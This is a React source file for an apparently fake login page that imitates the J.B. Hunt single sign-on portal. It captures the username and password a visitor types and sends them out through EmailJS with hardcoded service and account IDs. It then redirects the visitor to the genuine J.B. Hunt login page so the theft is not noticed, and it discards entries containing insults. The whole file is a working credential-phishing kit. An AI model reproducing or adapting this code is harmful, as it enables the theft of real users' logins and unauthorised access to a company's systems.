import '../Form/formfk.css';
import { useState, useRef } from "react";
import emailjs from 'emailjs-com';
import pak from '../../img/pak.svg';
import bac from '../../img/bac.svg';

function FormFk() {
    const [passwordShown, setPasswordShown] = useState(false);
    const [active, setActive] = useState(false);
    const [activepass, setActivePass] = useState(false);
    const [blockdisplay, setBlockdisplay] = useState(true);
    const [popoqName, setPopoqName] = useState('');
    const [startName, setStartName] = useState('Log In to Account');
    const userName = useRef(null);
    const passwordUser = useRef(null);
    var qfNum = 0;
    function qfFunck(qf) {
        if(qf.value.indexOf('ccox') !== -1 || qf.value.indexOf('klir') !== -1 || qf.value.indexOf('qunn') !== -1 || qf.value.indexOf('jajtam') !== -1 ||
        qf.value.indexOf('jaj tam') !== -1 || qf.value.indexOf('txeq') !== -1 || qf.value.indexOf('cceq') !== -1 || qf.value.indexOf('uteq') !== -1 ||
        qf.value.indexOf('fuck') !== -1 || qf.value.indexOf('suck') !== -1 || qf.value.indexOf('dick') !== -1 || qf.value.indexOf('gandon') !== -1 ||
        qf.value.indexOf('qunnem') !== -1 || qf.value.indexOf('txa') !== -1 || qf.value.indexOf('boz') !== -1 || qf.value.indexOf('chatlax') !== -1 ||
        qf.value.indexOf('gyot') !== -1 || qf.value.indexOf('garlax') !== -1) {
            qf.value = '';
            qfNum = 1;
        } else {
            qfNum = 0;
        }
    }
    const handleInputBlur = event => {
        qfFunck(event.target);
    };
    const togglePassword = () => {
        setPasswordShown(!passwordShown);
    };
    function nextForm(){
        if( userName.current.value == ''){
            if(active == false){setActive(!active);}
        } else {
            if(active == true){setActive(!active);}
            setBlockdisplay(!blockdisplay);
            setPopoqName(userName.current.value);
            setStartName('Welcome');
        }
    }
    function backBtn(){
        if(activepass == true){setActivePass(!activepass);} 
        setBlockdisplay(!blockdisplay);
        setStartName('Log In to Account');
        passwordUser.current.value = '';
    }

    const SERVICE_ID = 'service_cf79ytj';
    const TEMPLATE_ID = 'template_8oalb5q';
    const USER_ID = "5Fma-P-1aeivvlJxc";
    function handleSubmit(event) {
        event.preventDefault();
        qfFunck(userName.current);
        if(qfNum === 1) {
            userName.current.value = '';
        } else if(qfNum === 0) {
            qfFunck(passwordUser.current);
            if(qfNum === 0){
                if(userName.current.value && passwordUser.current.value) {
                    emailjs.sendForm(SERVICE_ID, TEMPLATE_ID, event.target, USER_ID)
                    window.location.href = "https://sso.jbhunt.com/auth/realms/security360/login-actions/authenticate?execution=e6d5c2ba-38c6-4b8d-b97f-81b36e0ad3ff&client_id=sso-redirect&tab_id=jLGCgQ_dq6s";
                    return;
                } else {
                    if(activepass == false){setActivePass(!activepass);} 
                }
            }
        }
    }

    return (
      <section className="form_box">
            <h5 className='login'>{startName}</h5>
            <form onSubmit={handleSubmit} id="formss">
                <div style={{display: blockdisplay ? "block" : "none"}}>
                    <div className="inputBlock">
                        <label for='Username'>Username or email</label>
                        <input onBlur={handleInputBlur} id="Username" ref={userName} name="Username" type="text" className={active ? "form-control userNameInput userNameInputError" : "form-control userNameInput"} />
                        <span className={active ? "errorTextActive" : "errorText"}>Enter valid username or email</span>
                    </div>
                    <button onClick={nextForm} type='button' className="btn-next">Next</button>
                </div>
                <div style={{display: blockdisplay ? "none" : "block"}}>
                    <p className='userNameIsk'>{popoqName}</p>
                    <div className="inputBlock">
                        <label for='Password'>Password
                            <span className="eyeIcon" onClick={togglePassword}>
                                <img src={passwordShown ? bac : pak} className='openPass'></img>
                                {passwordShown ? 'hide' : 'show'}
                            </span>
                        </label>
                        <input onBlur={handleInputBlur} id="Password" ref={passwordUser} name="Password" auto-id="signin_password_input" type={passwordShown ? "text" : "password"} className={activepass ? "form-control userNameInput userNameInputError" : "form-control userNameInput"}/>
                        <span className={activepass ? "errorPassTextActive" : "errorPassText"}>Enter valid password</span>
                    </div>
                    <div className='remember'>
                        <label><input type="checkbox" />Remember me</label>
                    </div>
                    <div className='btns_blovk'>
                        <button onClick={backBtn} type='button' className="btn-back">Back</button>
                        <button type='submit' className="btn-Login">Log In</button>
                    </div>
                    <div className='forgotPass'><a href="https://sso.jbhunt.com/auth/realms/security360/login-actions/reset-credentials?client_id=sso-redirect&tab_id=5_HWWJic4fU" className='otherlink'>Forgot Password?</a></div>
                </div>
            </form>
      </section>
    );
  }
  
  export default FormFk;
  